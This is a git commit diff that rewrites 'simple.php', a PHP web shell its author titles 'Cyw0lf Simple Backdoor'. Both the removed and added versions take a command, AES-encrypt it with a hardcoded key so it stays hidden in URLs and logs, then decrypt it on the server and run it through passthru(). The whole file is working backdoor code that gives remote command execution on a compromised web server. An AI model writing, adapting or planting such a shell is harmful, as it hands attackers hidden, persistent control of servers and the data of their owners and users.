251bbe264479d7fccb3b7f59da68d34feb467b82
cyw0lf <124285403+cyw0lf@users.noreply.github.com>
2023-08-15 07:11:02 +0700

    Update simple.php

--- simple.php
+++ simple.php
@@ -1,53 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cyberw0lf SimpleBD</title>
+    <title>Cyw0lf Simple Backdoor</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>
 </head>
 <body>
-    <?php
-    
-    $ekey = "_17anB4ckd00r1945";
-    
-    function encryptAES($data, $key) {
-        $cipher = "aes-256-cbc";
-        $iv = random_bytes(openssl_cipher_iv_length($cipher));
-        $encrypted = openssl_encrypt($data, $cipher, $key, 0, $iv);
-        return base64_encode($iv . $encrypted);
-    }
+<form id="encryptionForm">
+    Command: <input id="plaintext" rows="4" cols="50"></input>
+    <button type="button" onclick="encrypt()">Execute</button>
+</form>
 
-    function decryptAES($data, $key) {
-        $cipher = "aes-256-cbc";
-        $data = base64_decode($data);
-        $iv_length = openssl_cipher_iv_length($cipher);
-        $iv = substr($data, 0, $iv_length);
-        $encrypted = substr($data, $iv_length);
-        return openssl_decrypt($encrypted, $cipher, $key, 0, $iv);
+<script>
+    function encrypt() {
+        const secretKey = CryptoJS.enc.Latin1.parse("17anHtr4ce1945".padEnd(32, '\0'));
+        const iv = CryptoJS.enc.Latin1.parse("0123456789012345");
+        const plaintext = document.getElementById('plaintext').value;
+        const encrypted = CryptoJS.AES.encrypt(plaintext, secretKey, { iv: iv });
+        const url = `?i=${encodeURIComponent(iv.toString())}&c=${encodeURIComponent(encrypted.toString())}`;
+        window.location.href = window.location.pathname + url;
     }
+    document.getElementById('plaintext').addEventListener('keydown', function(event) {
+        if (event.key === 'Enter') {
+            event.preventDefault(); // Prevent form submission
+            encrypt(); // Call the encryption function
+        }
+    });
+</script>
 
-    if (isset($_GET['x'])) {
-        $x = $_GET['x'];
-        $encrypted_x = encryptAES($x, $ekey);
-        $target_url = "con.php?y=" . urlencode($encrypted_x);
-        header("Location: " . $target_url);
-        exit;
-    }
-
-    if (isset($_GET['y'])) {
-        $encrypted_x = $_GET['y'];
-        $decrypted_x = decryptAES($encrypted_x, $ekey);
-        
-    }
-    ?>
-
-    <form action="" method="get">
-        <label for="x">Command : </label>
-        <input type="text" name="x" id="x">
-        <input type="submit" value="Execute">
-    </form>
-    <br><pre>
-    <?php 
-    	echo passthru($decrypted_x);
-    ?>
-    </pre>
 </body>
 </html>
+<pre>
+<?php
+
+if (isset($_GET['c']) && isset($_GET['i'])) {
+    $secretKey = '17anHtr4ce1945';
+    $ivHex = $_GET['i'];
+    $encryptedMessage = $_GET['c'];
+
+    $iv = hex2bin($ivHex);
+    $decrypted = openssl_decrypt($encryptedMessage, 'aes-256-cbc', $secretKey, 0, $iv);
+    $cmd = passthru($decrypted);
+    if ($decrypted === false) {
+        echo "Decryption failed: " . openssl_error_string() . "\n";
+    } else {
+        echo $cmd;
+    }
+    exit;
+}
+
+?>
+</pre>
